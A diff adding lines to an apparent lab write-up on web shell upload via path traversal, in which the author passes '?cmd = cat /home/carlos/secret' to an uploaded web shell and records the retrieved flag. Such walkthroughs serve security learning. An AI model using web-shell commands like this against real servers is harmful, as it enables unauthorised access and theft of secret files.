@@ -79,4 +79,18 @@ Bingo! let's test our luck now
 
 ![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784716425902.webp)
 
-And okay this is new
+And okay this is new, let's pass the parameter and see if it works
+
+```
+?cmd = cat /home/carlos/secret
+```
+
+![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784716494381.webp)
+
+And now we just upload the flag
+
+```
+IFlUMMRFJ5a5J6WkvLkxQ3qBCK5GtSkX
+```
+
+![](../../../0.%20Assets/Web%20shell%20upload%20via%20path%20traversal-1784716520075.webp)
